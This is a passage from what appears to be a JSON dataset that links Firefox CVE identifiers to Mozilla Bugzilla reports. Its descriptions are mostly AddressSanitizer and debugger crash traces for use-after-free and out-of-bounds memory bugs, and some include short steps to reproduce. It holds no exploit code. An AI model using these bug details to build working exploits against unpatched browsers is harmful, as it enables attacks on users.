/builds/slave/try-lnx64-dbg/build/ipc/chromium/src/base/message_loop.cc:215 #14 0x7f437805a74e in MessageLoop::Run() /builds/slave/try-lnx64-dbg/build/ipc/chromium/src/base/message_loop.cc:182 #15 0x7f43778fcd31 in nsBaseAppShell::Run() /builds/slave/try-lnx64-dbg/build/widget/xpwidgets/nsBaseAppShell.cpp:163 #16 0x7f43774a3df0 in nsAppStartup::Run() /builds/slave/try-lnx64-dbg/build/toolkit/components/startup/nsAppStartup.cpp:290 #17 0x7f4375544084 in XREMain::XRE_mainRun() /builds/slave/try-lnx64-dbg/build/toolkit/xre/nsAppRunner.cpp:3792 #18 0x7f437554516d in XREMain::XRE_main(int, char**, nsXREAppData const*) /builds/slave/try-lnx64-dbg/build/toolkit/xre/nsAppRunner.cpp:3858 #19 0x7f4375545b21 in XRE_main /builds/slave/try-lnx64-dbg/build/toolkit/xre/nsAppRunner.cpp:3933 #20 0x409943 in do_main(int, char**) /builds/slave/try-lnx64-dbg/build/browser/app/nsBrowserApp.cpp:174 #21 0x409127 in main /builds/slave/try-lnx64-dbg/build/browser/app/nsBrowserApp.cpp:279 #22 0x7f4380c0376c in __libc_start_main /build/buildd/eglibc-2.15/csu/libc-start.c:226 0x7f43552f8bbc is located 27 bytes to the right of 33-byte region [0x7f43552f8b80,0x7f43552f8ba1) allocated by thread T0 here: #0 0x4354c0 in __interceptor_malloc ??:0 #1 0x7f4375ae3adb in imgFrame::Init(int, int, int, int, gfxASurface::gfxImageFormat, unsigned char) /builds/slave/try-lnx64-dbg/build/image/src/imgFrame.cpp:169 #2 0x7f4375ac6afe in mozilla::image::RasterImage::InternalAddFrame(unsigned int, int, int, int, int, gfxASurface::gfxImageFormat, unsigned char, unsigned char**, unsigned int*, unsigned int**, unsigned int*) /builds/slave/try-lnx64-dbg/build/image/src/RasterImage.cpp:1110 #3 0x7f4375ac73dd in mozilla::image::RasterImage::EnsureFrame(unsigned int, int, int, int, int, gfxASurface::gfxImageFormat, unsigned char, unsigned char**, unsigned int*, unsigned int**, unsigned int*) /builds/slave/try-lnx64-dbg/build/image/src/RasterImage.cpp:1232 #4 0x7f4375b2381f in mozilla::image::nsGIFDecoder2::BeginImageFrame(unsigned short) /builds/slave/try-lnx64-dbg/build/image/decoders/nsGIFDecoder2.cpp:185 #5 0x7f4375b27c1f in mozilla::image::nsGIFDecoder2::WriteInternal(char const*, unsigned int) /builds/slave/try-lnx64-dbg/build/image/decoders/nsGIFDecoder2.cpp:956 #6 0x7f4375ac902d in mozilla::image::RasterImage::WriteToDecoder(char const*, unsigned int) /builds/slave/try-lnx64-dbg/build/image/src/RasterImage.cpp:2478 #7 0x7f4375acfdc6 in mozilla::image::RasterImage::DecodeSomeData(unsigned int) /builds/slave/try-lnx64-dbg/build/image/src/RasterImage.cpp:3086 #8 0x7f4375ad06f2 in mozilla::image::RasterImage::DecodeWorker::DecodeSomeOfImage(mozilla::image::RasterImage*, mozilla::image::RasterImage::DecodeWorker::DecodeType) /builds/slave/try-lnx64-dbg/build/image/src/RasterImage.cpp:3398 #9 0x7f4375ac9446 in mozilla::image::RasterImage::SourceDataComplete() /builds/slave/try-lnx64-dbg/build/image/src/RasterImage.cpp:1672 #10 0x7f4375b05e96 in imgRequest::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) /builds/slave/try-lnx64-dbg/build/image/src/imgRequest.cpp:582 #11 0x7f437661a231 in mozilla::dom::MediaDocumentStreamListener::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) /builds/slave/try-lnx64-dbg/build/content/html/document/src/MediaDocument.cpp:67 #12 0x7f4377378616 in nsDocumentOpenInfo::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) /builds/slave/try-lnx64-dbg/build/uriloader/base/nsURILoader.cpp:293 #13 0x7f4375593ce1 in nsBaseChannel::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) /builds/slave/try-lnx64-dbg/build/netwerk/base/src/nsBaseChannel.cpp:757 #14 0x7f4375593dfc in non-virtual thunk to nsBaseChannel::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) /builds/slave/try-lnx64-dbg/build/media/libvpx/vp8/encoder/x86/quantize_mmx.asm:0 #15 0x7f43755ba214 in nsInputStreamPump::OnStateStop() /builds/slave/try-lnx64-dbg/build/netwerk/base/src/nsInputStreamPump.cpp:552 #16 0x7f43755b8ea7 in nsInputStreamPump::OnInputStreamReady(nsIAsyncInputStream*) /builds/slave/try-lnx64-dbg/build/netwerk/base/src/nsInputStreamPump.cpp:374 #17 0x7f4377f9802d in nsInputStreamReadyEvent::Run() /builds/slave/try-lnx64-dbg/build/xpcom/io/nsStreamUtils.cpp:82 #18 0x7f4377fcd22b in nsThread::ProcessNextEvent(bool, bool*) /builds/slave/try-lnx64-dbg/build/xpcom/threads/nsThread.cpp:612 #19 0x7f4377f1ba12 in NS_ProcessNextEvent_P(nsIThread*, bool) /builds/slave/try-lnx64-dbg/build/obj-firefox/xpcom/build/nsThreadUtils.cpp:220 #20 0x7f4377b6442b in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/slave/try-lnx64-dbg/build/ipc/glue/MessagePump.cpp:82 #21 0x7f437805a851 in MessageLoop::RunInternal() /builds/slave/try-lnx64-dbg/build/ipc/chromium/src/base/message_loop.cc:215 #22 0x7f437805a74e in MessageLoop::Run() /builds/slave/try-lnx64-dbg/build/ipc/chromium/src/base/message_loop.cc:182 #23 0x7f43778fcd31 in nsBaseAppShell::Run() /builds/slave/try-lnx64-dbg/build/widget/xpwidgets/nsBaseAppShell.cpp:163 #24 0x7f43774a3df0 in nsAppStartup::Run() /builds/slave/try-lnx64-dbg/build/toolkit/components/startup/nsAppStartup.cpp:290 Shadow byte and word: 0x1fe86aa5f177: fb 0x1fe86aa5f170: 00 00 00 00 01 fb fb fb More shadow bytes: 0x1fe86aa5f150: 00 00 00 00 00 00 00 00 0x1fe86aa5f158: 00 00 00 00 00 00 fb fb 0x1fe86aa5f160: fa fa fa fa fa fa fa fa 0x1fe86aa5f168: fa fa fa fa fa fa fa fa =>0x1fe86aa5f170: 00 00 00 00 01 fb fb fb 0x1fe86aa5f178: fb fb fb fb fb fb fb fb 0x1fe86aa5f180: fa fa fa fa fa fa fa fa 0x1fe86aa5f188: fa fa fa fa fa fa fa fa 0x1fe86aa5f190: 00 00 00 00 00 00 00 00 Stats: 225M malloced (243M for red zones) by 348346 calls Stats: 33M realloced by 21083 calls Stats: 197M freed by 224732 calls Stats: 63M really freed by 132000 calls Stats: 448M (114771 full pages) mmaped in 112 calls mmaps by size class: 8:245745; 9:32764; 10:16380; 11:12282; 12:3072; 13:1536; 14:1280; 15:256; 16:512; 17:1280; 18:192; 19:40; 20:20; mallocs by size class: 8:274234; 9:34150; 10:18865; 11:12880; 12:2580; 13:1750; 14:1449; 15:269; 16:634; 17:1280; 18:198; 19:37; 20:20; frees by size class: 8:170193; 9:23848; 10:14205; 11:9794; 12:1575; 13:1564; 14:1294; 15:223; 16:565; 17:1267; 18:150; 19:36; 20:18; rfrees by size class: 8:108284; 9:8216; 10:7581; 11:5595; 12:528; 13:477; 14:478; 15:100; 16:346; 17:384; 18:6; 19:4; 20:1; Stats: malloc large: 1535 small slow: 1841 ==11528== ABORTING"
      }
    ],
    "CVE-2013-0775": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=831095",
        "title": "Use-After-Free crash @xul!nsImageLoadingContent::OnStopContainer",
        "description": "The attached testcase crashes when loaded in latest Firefox nightly. Crashes at random memory addresses. Stack trace on windows (this was with the previous testcase which loaded a jpeg file instead of png from data uri): xul!nsImageLoadingContent::OnStopContainer+0x37: 64fcc61e ff5128 call dword ptr [ecx+28h] ds:002b:00000029=???????? 0:000:x86> cdb: Reading initial command 'kp 16;q' ChildEBP RetAddr 0033cb58 64e6eac6 xul!nsImageLoadingContent::OnStopContainer(class imgIRequest * aRequest = 0x07dc8e00, class imgIContainer * aContainer = 0x0779a790)+0x37 0033cb6c 64e2229d xul!imgRequestProxy::OnStopContainer(class imgIContainer * image = 0x0779a790)+0x36 0033cbfc 64dfd62b xul!imgRequest::OnStopDecode(class imgIRequest * aRequest = 0x00000000, tag_nsresult aStatus = NS_OK (0n0), wchar_t * aStatusArg = 0x00000000 \"\")+0xad 0033cc24 6501fca4 xul!mozilla::image::Decoder::PostDecodeDone(void)+0x67 *** WARNING: Unable to verify checksum for C:\\Program Files (x86)\\Mozilla Firefox\\gkmedias.dll 0033cc2c 66072e8f xul!mozilla::image::term_source(struct jpeg_decompress_struct * jd = 0x07d47438)+0x14 0033cc38 64f86b63 gkmedias!jpeg_finish_decompress(struct jpeg_decompress_struct * cinfo = 0x07d47438)+0x5a 0033ce74 64f5beaf xul!mozilla::image::nsJPEGDecoder::WriteInternal(char * aBuffer = 0x07df5008 \"G???\", unsigned int aCount = 0x18e)+0x359 0033ce90 64faf970 xul!mozilla::image::RasterImage::WriteToDecoder(char * aBuffer = 0x07df5008 \"G???\", unsigned int aCount = 0x18e)+0x41 0033ceac 64f6ff0b xul!mozilla::image::RasterImage::DecodeSomeData(unsigned int aMaxBytes = 0x1000)+0x37 0033ceec 64fbaa9b xul!mozilla::image::RasterImage::DecodeWorker::DecodeSomeOfImage(class mozilla::image::RasterImage * aImg = 0x0779a790, mozilla::image::RasterImage::DecodeWorker::DecodeType aDecodeType = DECODE_TYPE_NORMAL (0n0))+0xbc 0033cf28 64e91dbf xul!mozilla::image::RasterImage::DecodeWorker::Run(void)+0xb6 0033cf98 6503c86f xul!nsThread::ProcessNextEvent(bool mayWait = false, bool * result = 0x0033cfd4)+0x2cf 0033cfcc 6504ca2b xul!mozilla::ipc::MessagePump::Run(class base::MessagePump::Delegate * aDelegate = 0x00a42001)+0x5f 0033d004 6504c9d3 xul!MessageLoop::RunHandler(void)+0x21 0033d020 6502fc8f xul!MessageLoop::Run(void)+0x15 0033d02c 6504c953 xul!nsBaseAppShell::Run(void)+0x34 0033ef80 65076c9d xul!nsAppShell::Run(void)+0x4e 0033ef8c 64fbc83a xul!nsAppStartup::Run(void)+0x1e 0033f058 6501522d xul!XREMain::XRE_mainRun(void)+0x405 0033f074 65037bb4 xul!XREMain::XRE_main(int argc = 0n5, char ** argv = 0x00134660, struct nsXREAppData * aAppData = 0x00c332e0)+0xde *** WARNING: Unable to verify checksum for firefox.exe 0033f18c 00c31742 xul!XRE_main(int argc = 0n5, char ** argv = 0x00134660, struct nsXREAppData * aAppData = 0x00c332e0, unsigned int aFlags = 0)+0x30 0033fc64 00c31a64 firefox!wmain(int argc = 0n5, wchar_t ** argv = 0x00132e90)+0x742 quit:"
      }
    ],
    "CVE-2013-0777": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=798691",
        "title": "Heap-use-after-free in nsDisplayBoxShadowOuter::Paint",
        "description": "Reproduces on trunk. Steps 1. Visit http://ie.microsoft.com/testdrive/Graphics/HP 2. Open print dialog using ctrl+p 3. Select any printer and enter. ================================================================= ==6937== ERROR: AddressSanitizer heap-use-after-free on address 0x7f95d27c5080 at pc 0x42f6b6 bp 0x7fff2af037f0 sp 0x7fff2af02fb8 WRITE of size 1 at 0x7f95d27c5080 thread T0 #0 0x42f6b5 in memcpy ??:? #1 0x7f96206d4df8 in _cairo_surface_snapshot_copy_on_write gfx/cairo/cairo/src/cairo-surface-snapshot.c:140 #2 0x7f961d4cbead in nsDisplayBoxShadowOuter::Paint(nsDisplayListBuilder*, nsRenderingContext*) layout/base/nsDisplayList.cpp:2294 #3 0x7f961d403091 in mozilla::FrameLayerBuilder::DrawThebesLayer(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*) layout/base/FrameLayerBuilder.cpp:3238 #4 0x7f96204b53ff in mozilla::layers::BasicThebesLayer::PaintThebes(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) gfx/layers/basic/BasicThebesLayer.cpp:139 #5 0x7f9620497455 in mozilla::layers::BasicLayerManager::PaintSelfOrChildren(mozilla::layers::PaintContext&, gfxContext*) gfx/layers/basic/BasicLayerManager.cpp:822 #6 0x7f9620494f8a in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) gfx/layers/basic/BasicLayerManager.cpp:931 #7 0x7f9620497295 in mozilla::layers::BasicLayerManager::PaintSelfOrChildren(mozilla::layers::PaintContext&, gfxContext*) gfx/layers/basic/BasicLayerManager.cpp:838 #8 0x7f9620494f8a in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) gfx/layers/basic/BasicLayerManager.cpp:931 #9 0x7f9620497295 in mozilla::layers::BasicLayerManager::PaintSelfOrChildren(mozilla::layers::PaintContext&, gfxContext*) gfx/layers/basic/BasicLayerManager.cpp:838 #10 0x7f9620494f8a in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) gfx/layers/basic/BasicLayerManager.cpp:931 #11 0x7f96204922b9 in mozilla::layers::BasicLayerManager::EndTransactionInternal(void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::LayerManager::EndTransactionFlags) gfx/layers/basic/BasicLayerManager.cpp:589 #12 0x7f961d4ba9fb in nsDisplayList::PaintForFrame(nsDisplayListBuilder*, nsRenderingContext*, nsIFrame*, unsigned int) const layout/base/nsDisplayList.cpp:1098 #13 0x7f961d4b9751 in nsDisplayList::PaintRoot(nsDisplayListBuilder*, nsRenderingContext*, unsigned int) const layout/base/nsDisplayList.cpp:966 #14 0x7f961d531253 in nsLayoutUtils::PaintFrame(nsRenderingContext*, nsIFrame*, nsRegion const&, unsigned int, unsigned int) layout/base/nsLayoutUtils.cpp:1835 #15 0x7f961d79c4e7 in nsSimplePageSequenceFrame::PrintNextPage() layout/generic/nsSimplePageSequence.cpp:763 #16 0x7f961ec11ef3 in nsPrintEngine::PrintPage(nsPrintObject*, bool&) layout/printing/nsPrintEngine.cpp:2824 #17 0x7f961ec177d3 in nsPagePrintTimer::Run() layout/printing/nsPagePrintTimer.cpp:87 #18 0x7f96202d4251 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:612 #19 0x7f962020d073 in NS_ProcessNextEvent_P(nsIThread*, bool) objdir-ff-asan/xpcom/build/nsThreadUtils.cpp:220 #20 0x7f961fdd1ce0 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:82 #21 0x7f962036281b in MessageLoop::RunInternal() ipc/chromium/src/base/message_loop.cc:208 #22 0x7f961faccb0d in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:163 #23 0x7f961cdb82c4 in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:3848 #24 0x7f961cdb939a in XRE_main toolkit/xre/nsAppRunner.cpp:3923 #25 0x408d05 in do_main(int, char**) browser/app/nsBrowserApp.cpp:174 #26 0x7f962681976c in ?? ??:0 0x7f95d27c5080 is located 0 bytes inside of 6844-byte region [0x7f95d27c5080,0x7f95d27c6b3c) freed by thread T0 here: #0 0x432d90 in __interceptor_free ??:? #1 0x7f96203c22e6 in ~gfxAlphaBoxBlur gfx/thebes/gfxBlur.cpp:23 #2 0x7f961d4cbead in nsDisplayBoxShadowOuter::Paint(nsDisplayListBuilder*, nsRenderingContext*) layout/base/nsDisplayList.cpp:2294 #3 0x7f961d403091 in mozilla::FrameLayerBuilder::DrawThebesLayer(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*) layout/base/FrameLayerBuilder.cpp:3238 #4 0x7f96204b53ff in mozilla::layers::BasicThebesLayer::PaintThebes(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) gfx/layers/basic/BasicThebesLayer.cpp:139 #5 0x7f9620497455 in mozilla::layers::BasicLayerManager::PaintSelfOrChildren(mozilla::layers::PaintContext&, gfxContext*) gfx/layers/basic/BasicLayerManager.cpp:822 #6 0x7f9620494f8a in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) gfx/layers/basic/BasicLayerManager.cpp:931 #7 0x7f9620497295 in mozilla::layers::BasicLayerManager::PaintSelfOrChildren(mozilla::layers::PaintContext&, gfxContext*) gfx/layers/basic/BasicLayerManager.cpp:838 #8 0x7f9620494f8a in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) gfx/layers/basic/BasicLayerManager.cpp:931 #9 0x7f9620497295 in mozilla::layers::BasicLayerManager::PaintSelfOrChildren(mozilla::layers::PaintContext&, gfxContext*) gfx/layers/basic/BasicLayerManager.cpp:838 #10 0x7f9620494f8a in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) gfx/layers/basic/BasicLayerManager.cpp:931 #11 0x7f96204922b9 in mozilla::layers::BasicLayerManager::EndTransactionInternal(void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::LayerManager::EndTransactionFlags) gfx/layers/basic/BasicLayerManager.cpp:589 #12 0x7f961d4ba9fb in nsDisplayList::PaintForFrame(nsDisplayListBuilder*, nsRenderingContext*, nsIFrame*, unsigned int) const layout/base/nsDisplayList.cpp:1098 #13 0x7f961d4b9751 in nsDisplayList::PaintRoot(nsDisplayListBuilder*, nsRenderingContext*, unsigned int) const layout/base/nsDisplayList.cpp:966 #14 0x7f961d531253 in nsLayoutUtils::PaintFrame(nsRenderingContext*, nsIFrame*, nsRegion const&, unsigned int, unsigned int) layout/base/nsLayoutUtils.cpp:1835 #15 0x7f961d79c4e7 in nsSimplePageSequenceFrame::PrintNextPage() layout/generic/nsSimplePageSequence.cpp:763 #16 0x7f961ec11ef3 in nsPrintEngine::PrintPage(nsPrintObject*, bool&) layout/printing/nsPrintEngine.cpp:2824 #17 0x7f961ec177d3 in nsPagePrintTimer::Run() layout/printing/nsPagePrintTimer.cpp:87 #18 0x7f96202d4251 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:612 #19 0x7f962020d073 in NS_ProcessNextEvent_P(nsIThread*, bool) objdir-ff-asan/xpcom/build/nsThreadUtils.cpp:220 #20 0x7f961fdd1ce0 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:82 #21 0x7f962036281b in MessageLoop::RunInternal() ipc/chromium/src/base/message_loop.cc:208 #22 0x7f961faccb0d in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:163 #23 0x7f961cdb82c4 in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:3848 #24 0x7f961cdb939a in XRE_main toolkit/xre/nsAppRunner.cpp:3923 #25 0x408d05 in do_main(int, char**) browser/app/nsBrowserApp.cpp:174 #26 0x7f962681976c in ?? ??:0 previously allocated by thread T0 here: #0 0x432e50 in malloc ??:? #1 0x7f9620c55760 in AlphaBoxBlur gfx/2d/Blur.cpp:384 #2 0x7f96203c2a35 in gfxAlphaBoxBlur::Init(gfxRect const&, nsIntSize const&, nsIntSize const&, gfxRect const*, gfxRect const*) gfx/thebes/gfxBlur.cpp:52 #3 0x7f961d4741f0 in nsContextBoxBlur::Init(nsRect const&, int, int, int, gfxContext*, nsRect const&, gfxRect const*, unsigned int) layout/base/nsCSSRendering.cpp:4559 #4 0x7f961d472401 in nsCSSRendering::PaintBoxShadowOuter(nsPresContext*, nsRenderingContext&, nsIFrame*, nsRect const&, nsRect const&) layout/base/nsCSSRendering.cpp:1244 #5 0x7f961d4cbead in nsDisplayBoxShadowOuter::Paint(nsDisplayListBuilder*, nsRenderingContext*) layout/base/nsDisplayList.cpp:2294 #6 0x7f961d403091 in mozilla::FrameLayerBuilder::DrawThebesLayer(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*) layout/base/FrameLayerBuilder.cpp:3238 #7 0x7f96204b53ff in mozilla::layers::BasicThebesLayer::PaintThebes(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) gfx/layers/basic/BasicThebesLayer.cpp:139 #8 0x7f9620497455 in mozilla::layers::BasicLayerManager::PaintSelfOrChildren(mozilla::layers::PaintContext&, gfxContext*) gfx/layers/basic/BasicLayerManager.cpp:822 #9 0x7f9620494f8a in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) gfx/layers/basic/BasicLayerManager.cpp:931 #10 0x7f9620497295 in mozilla::layers::BasicLayerManager::PaintSelfOrChildren(mozilla::layers::PaintContext&, gfxContext*) gfx/layers/basic/BasicLayerManager.cpp:838 #11 0x7f9620494f8a in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) gfx/layers/basic/BasicLayerManager.cpp:931 #12 0x7f9620497295 in mozilla::layers::BasicLayerManager::PaintSelfOrChildren(mozilla::layers::PaintContext&, gfxContext*) gfx/layers/basic/BasicLayerManager.cpp:838 #13 0x7f9620494f8a in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) gfx/layers/basic/BasicLayerManager.cpp:931 #14 0x7f96204922b9 in mozilla::layers::BasicLayerManager::EndTransactionInternal(void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::LayerManager::EndTransactionFlags) gfx/layers/basic/BasicLayerManager.cpp:589 #15 0x7f961d4ba9fb in nsDisplayList::PaintForFrame(nsDisplayListBuilder*, nsRenderingContext*, nsIFrame*, unsigned int) const layout/base/nsDisplayList.cpp:1098 #16 0x7f961d4b9751 in nsDisplayList::PaintRoot(nsDisplayListBuilder*, nsRenderingContext*, unsigned int) const layout/base/nsDisplayList.cpp:966 #17 0x7f961d531253 in nsLayoutUtils::PaintFrame(nsRenderingContext*, nsIFrame*, nsRegion const&, unsigned int, unsigned int) layout/base/nsLayoutUtils.cpp:1835 #18 0x7f961d79c4e7 in nsSimplePageSequenceFrame::PrintNextPage() layout/generic/nsSimplePageSequence.cpp:763 #19 0x7f961ec11ef3 in nsPrintEngine::PrintPage(nsPrintObject*, bool&) layout/printing/nsPrintEngine.cpp:2824 #20 0x7f961ec177d3 in nsPagePrintTimer::Run() layout/printing/nsPagePrintTimer.cpp:87 #21 0x7f96202d4251 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:612 #22 0x7f962020d073 in NS_ProcessNextEvent_P(nsIThread*, bool) objdir-ff-asan/xpcom/build/nsThreadUtils.cpp:220 #23 0x7f961fdd1ce0 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:82 #24 0x7f962036281b in MessageLoop::RunInternal() ipc/chromium/src/base/message_loop.cc:208 Shadow byte and word: 0x1ff2ba4f8a10: fd 0x1ff2ba4f8a10: fd fd fd fd fd fd fd fd More shadow bytes: 0x1ff2ba4f89f0: fa fa fa fa fa fa fa fa 0x1ff2ba4f89f8: fa fa fa fa fa fa fa fa 0x1ff2ba4f8a00: fa fa fa fa fa fa fa fa 0x1ff2ba4f8a08: fa fa fa fa fa fa fa fa =>0x1ff2ba4f8a10: fd fd fd fd fd fd fd fd 0x1ff2ba4f8a18: fd fd fd fd fd fd fd fd 0x1ff2ba4f8a20: fd fd fd fd fd fd fd fd 0x1ff2ba4f8a28: fd fd fd fd fd fd fd fd 0x1ff2ba4f8a30: fd fd fd fd fd fd fd fd Stats: 905M malloced (979M for red zones) by 1833862 calls Stats: 105M realloced by 83665 calls Stats: 837M freed by 1481377 calls Stats: 699M really freed by 1274702 calls Stats: 868M (222350 full pages) mmaped in 215 calls mmaps by size class: 8:770001; 9:65528; 10:32760; 11:20470; 12:8192; 13:6144; 14:1792; 15:640; 16:1216; 17:1248; 18:336; 19:56; 20:24; 21:22; 22:5; 23:2; mallocs by size class: 8:1485067; 9:165298; 10:82797; 11:55504; 12:19877; 13:11914; 14:5299; 15:1882; 16:2399; 17:2909; 18:653; 19:160; 20:55; 21:38; 22:7; 23:3; frees by size class: 8:1168626; 9:145581; 10:75352; 11:50174; 12:17771; 13:11299; 14:4892; 15:1747; 16:2233; 17:2853; 18:596; 19:155; 20:53; 21:37; 22:6; 23:2; rfrees by size class: 8:1006654; 9:124075; 10:64219; 11:44235; 12:14331; 13:10277; 14:4368; 15:1477; 16:1972; 17:2358; 18:550; 19:108; 20:45; 21:27; 22:5; 23:1; Stats: malloc large: 3825 small slow: 8875 ==6937== ABORTING"
      }
    ],
    "CVE-2013-0778": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=798867",
        "title": "Out-of-bounds read in ClusterIterator::NextCluster",
        "description": "Reproduces on trunk by double-clicking anywhere in the content window. ================================================================= ==11059== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7f0f8a78828b at pc 0x7f0fb1376d36 bp 0x7fffe7937850 sp 0x7fffe7937848 READ of size 1 at 0x7f0f8a78828b thread T0 #0 0x7f0fb1376d35 in ClusterIterator::NextCluster() layout/generic/nsTextFrameThebes.cpp:6659 #1 0x7f0fb137ab2a in nsTextFrame::PeekOffsetWord(bool, bool, bool, int*, nsIFrame::PeekWordState*) layout/generic/nsTextFrameThebes.cpp:6733 #2 0x7f0fb0fa0b57 in nsIFrame::PeekOffset(nsPeekOffsetStruct*) layout/generic/nsFrame.cpp:6226 #3 0x7f0fb0f5b56e in nsFrame::PeekBackwardAndForward(nsSelectionAmount, nsSelectionAmount, int, nsPresContext*, bool, unsigned int) layout/generic/nsFrame.cpp:2954 #4 0x7f0fb0f5a4f5 in nsFrame::SelectByTypeAtPoint(nsPresContext*, nsPoint const&, nsSelectionAmount, nsSelectionAmount, unsigned int) layout/generic/nsFrame.cpp:2862 #5 0x7f0fb0f5d56b in nsFrame::HandleMultiplePress(nsPresContext*, nsGUIEvent*, nsEventStatus*, bool) layout/generic/nsFrame.cpp:2911 #6 0x7f0fb0f559d9 in nsFrame::HandlePress(nsPresContext*, nsGUIEvent*, nsEventStatus*) layout/generic/nsFrame.cpp:2710 #7 0x7f0fb0f4f9b7 in nsFrame::HandleEvent(nsPresContext*, nsGUIEvent*, nsEventStatus*) layout/generic/nsFrame.cpp:2401 #8 0x7f0fb0c2a70e in nsPresShellEventCB::HandleEvent(nsEventChainPostVisitor&) layout/base/nsPresShell.cpp:491 #9 0x7f0fb338abd3 in nsEventTargetChainItem::HandleEventTargetChain(nsEventChainPostVisitor&, unsigned int, nsDispatchingCallback*, bool, nsCxPusher*) content/events/src/nsEventDispatcher.cpp:362 #10 0x7f0fb338fe79 in nsEventDispatcher::Dispatch(nsISupports*, nsPresContext*, nsEvent*, nsIDOMEvent*, nsEventStatus*, nsDispatchingCallback*, nsCOMArray<nsIDOMEventTarget>*) content/events/src/nsEventDispatcher.cpp:629 #11 0x7f0fb0be882c in PresShell::HandleEventInternal(nsEvent*, nsEventStatus*) layout/base/nsPresShell.cpp:6437 #12 0x7f0fb0be2ea3 in PresShell::HandlePositionedEvent(nsIFrame*, nsGUIEvent*, nsEventStatus*) layout/base/nsPresShell.cpp:6208 #13 0x7f0fb0bdaed6 in PresShell::HandleEvent(nsIFrame*, nsGUIEvent*, bool, nsEventStatus*) layout/base/nsPresShell.cpp:6007 #14 0x7f0fb454c39c in nsViewManager::DispatchEvent(nsGUIEvent*, nsIView*, nsEventStatus*) view/src/nsViewManager.cpp:767 #15 0x7f0fb4537f37 in nsView::HandleEvent(nsGUIEvent*, bool) view/src/nsView.cpp:1062 #16 0x7f0fb453818d in non-virtual thunk to nsView::HandleEvent(nsGUIEvent*, bool) :? #17 0x7f0fb9ca5e0a in nsWindow::DispatchEvent(nsGUIEvent*, nsEventStatus&) widget/gtk2/nsWindow.cpp:458 #18 0x7f0fb9cd9541 in nsWindow::OnButtonPressEvent(_GtkWidget*, _GdkEventButton*) widget/gtk2/nsWindow.cpp:2729 #19 0x7f0fb9cf04d9 in 